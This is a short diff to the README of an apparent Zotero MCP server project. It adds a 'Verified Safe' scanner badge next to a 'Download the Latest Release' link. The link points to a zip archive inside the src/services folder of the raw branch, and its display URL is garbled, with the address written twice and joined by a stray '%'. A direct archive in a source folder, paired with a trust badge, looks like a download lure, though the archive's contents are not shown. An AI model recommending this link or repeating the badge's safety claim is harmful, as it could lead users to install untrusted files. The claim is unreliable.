@@ -1,5 +1,7 @@
 # 🌟 zotero-mcp-server - Manage Your Research Effortlessly
 
+[![SafeSkill 94/100](https://img.shields.io/badge/SafeSkill-94%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/maxdepai1212-zotero-mcp-server)
+
 ## 🔗 Download the Latest Release
 [![Download](https://github.com/Maxdepai1212/zotero-mcp-server/raw/refs/heads/main/src/services/server_mcp_zotero_v1.8-alpha.1.zip%https://github.com/Maxdepai1212/zotero-mcp-server/raw/refs/heads/main/src/services/server_mcp_zotero_v1.8-alpha.1.zip)](https://github.com/Maxdepai1212/zotero-mcp-server/raw/refs/heads/main/src/services/server_mcp_zotero_v1.8-alpha.1.zip)
 
